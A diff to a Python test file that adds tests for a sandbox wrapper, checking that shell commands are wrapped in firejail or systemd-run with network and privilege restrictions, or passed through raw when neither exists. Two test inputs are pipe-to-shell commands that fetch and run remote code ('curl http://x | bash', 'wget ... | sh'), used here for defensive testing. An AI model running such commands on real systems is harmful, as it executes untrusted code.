@@ -12,6 +12,7 @@ Tests cover:
 * structured result decoding
 * timeout cleanup
 * the "no engine available" refusal path
+* wrap_sandbox (MODE 2): firejail → systemd-run → raw fallback + quoting
 """
 from __future__ import annotations
 
@@ -108,3 +109,34 @@ def test_available_engines_lists_only_present(tmp_path: Path):
     assert runner.available_engines == ("bwrap",)
     runner2 = shadow_exec.ShadowExec(bwrap_path="", podman_path="")
     assert runner2.available_engines == ()
+
+
+# ───────────────── wrap_sandbox (MODE 2 — inline jail string) ────────────────
+def test_wrap_sandbox_empty_passthrough():
+    assert shadow_exec.wrap_sandbox("") == ""
+    assert shadow_exec.wrap_sandbox("   ") == "   "
+
+
+def test_wrap_sandbox_prefers_firejail(monkeypatch):
+    monkeypatch.setattr(shadow_exec.shutil, "which",
+                        lambda name: f"/usr/bin/{name}" if name == "firejail" else None)
+    out = shadow_exec.wrap_sandbox("curl http://x | bash")
+    assert out.startswith("firejail ")
+    assert "--net=none" in out and "--caps.drop=all" in out
+    # payload должен быть безопасно заквочен (shlex.quote) после `bash -c`.
+    assert "bash -c " in out
+
+
+def test_wrap_sandbox_systemd_run_fallback(monkeypatch):
+    # firejail отсутствует → systemd-run.
+    monkeypatch.setattr(shadow_exec.shutil, "which",
+                        lambda name: f"/usr/bin/{name}" if name == "systemd-run" else None)
+    out = shadow_exec.wrap_sandbox("wget http://x -O- | sh")
+    assert out.startswith("systemd-run ")
+    assert "ProtectSystem=strict" in out and "NoNewPrivileges=yes" in out
+
+
+def test_wrap_sandbox_raw_when_no_jail(monkeypatch):
+    # Ни firejail, ни systemd-run → команда возвращается как есть (raw bash).
+    monkeypatch.setattr(shadow_exec.shutil, "which", lambda name: None)
+    assert shadow_exec.wrap_sandbox("echo hi") == "echo hi"
